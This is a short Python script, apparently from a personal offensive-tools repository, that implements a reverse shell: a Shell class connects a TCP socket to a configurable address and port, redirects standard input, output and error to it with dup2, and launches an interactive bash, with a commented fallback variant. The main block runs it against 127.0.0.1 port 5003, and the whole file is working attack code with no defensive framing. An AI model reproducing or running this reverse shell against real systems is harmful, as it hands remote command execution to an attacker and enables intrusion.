# !/usr/bin/env python3

from subprocess import run
import os


# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyj33k                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Github  :   @keyj33k                  #
#   Version :   1.0.5                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # #

class Shell:

    def __init__(
            self,
            target_address,
            target_port
    ):
        self.target_address = target_address
        self.target_port = target_port

    def shell(self):
        with socket.socket(
            socket.AF_INET,  # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
            socket.SOCK_STREAM
        ) as socket_sock:
            socket_sock.connect((
                self.target_address,
                self.target_port
            ))

            dup2(
                socket_sock.fileno(),
                0
            )  # return stream integer file descriptor
            dup2(
                socket_sock.fileno(),
                1
            )  # used for request I/O actions from the OS
            dup2(
                socket_sock.fileno(),
                2
            )

            run(
                [
                    "/bin/bash",
                    "-i"
                ]
            )

            """
            Try this code below if you have any issues.
            run(
                [
                    "/bin/bash"
                ], 
                shell=True
            )
            """


if __name__ == "__main__":
    from os import dup2
    import socket

    os.system('clear')

    reverse_connection = Shell(
        "127.0.0.1",
        int(5003)
    )

    reverse_connection.shell()
